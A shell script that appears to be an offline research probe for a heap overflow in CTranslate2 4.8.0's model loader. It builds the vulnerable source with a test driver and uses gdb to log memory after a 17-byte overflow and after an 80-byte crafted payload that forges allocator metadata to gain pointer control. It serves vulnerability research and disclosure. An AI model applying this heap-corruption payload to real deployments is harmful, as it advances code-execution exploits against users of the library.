#!/bin/sh
# Pointer-control probe for CVE-2026-102566 (W2, 2026-11-25).
# Uses the verbatim vulnerable upstream model.cc and real allocator, with a
# payload-controlled driver, to ask whether file bytes can reach a pointer
# that is later dereferenced. Offline; no probe off loopback.
set -eu
cd "$(dirname "$0")"
SRC=src/CTranslate2-4.8.0
INC="-I$SRC/include -I$SRC/third_party -Ishim -I$SRC/src"
REAL="$SRC/src/models/model_reader.cc $SRC/src/storage_view.cc $SRC/src/allocator.cc \
$SRC/src/cpu/allocator.cc $SRC/src/cpu/primitives.cc $SRC/src/cpu/backend.cc \
$SRC/src/cpu/cpu_isa.cc $SRC/src/cpu/kernels.cc $SRC/src/env.cc $SRC/src/types.cc \
$SRC/src/devices.cc"
FLAGS="-std=c++17 -O0 -g -ffunction-sections -fdata-sections -DCT2_X86_BUILD $INC -Wl,--gc-sections"

g++ $FLAGS harness/driver-ptr.cpp harness/stubs.cpp "$SRC/src/models/model.cc" $REAL -o consumer-payload
mkdir -p evidence
sha256sum "$SRC/src/models/model.cc" > evidence/pointer-probe.sha256

# Case 1: 17-byte file-chosen payload; observe what follows the 16-byte buffer
# at the instant of the vulnerable store and after register_variable().
gdb -q -batch \
  -ex 'set pagination off' \
  -ex 'break model.cc:657' \
  -ex 'run 17' \
  -ex 'set $b=(char*)variable.buffer()' \
  -ex 'printf "FIRST=%p\n", $b' \
  -ex 'x/12gx $b' \
  -ex 'continue' \
  -ex 'printf "SECOND=%p delta=%ld\n", (char*)variable.buffer(), (char*)variable.buffer()-$b' \
  -ex 'x/16gx $b' \
  -ex 'p model->_variable_index' \
  --args ./consumer-payload 17 > evidence/pointer-layout-n17.txt 2>&1 || true

# Case 2: 80 chosen bytes. Offsets 24..31 hold the top-chunk size observed at
# the store; later 8-byte slots try to keep allocator metadata credible while
# placing chosen values where the following control block will be built.
PAYLOAD=4142434445464748494a4b4c4d4e4f505152535455565758f1d6000000000000414141414141414161d6000000000000424242424242424241d600000000000043434343434343434444444444444444
gdb -q -batch \
  -ex 'set pagination off' \
  -ex 'break model.cc:657' \
  -ex "run 80 $PAYLOAD" \
  -ex 'set $b=(char*)variable.buffer()' \
  -ex 'printf "FIRST=%p\n", $b' \
  -ex 'x/8gx $b' \
  -ex 'continue' \
  -ex 'printf "SECOND=%p\n", (char*)variable.buffer()' \
  -ex 'x/16gx $b' \
  -ex 'p model->_variable_index' \
  -ex 'continue' \
  -ex 'bt 4' \
  --args ./consumer-payload 80 "$PAYLOAD" > evidence/pointer-chosen-80.txt 2>&1 || true

printf 'sha256 of upstream model.cc used by probe:\n'
cat evidence/pointer-probe.sha256
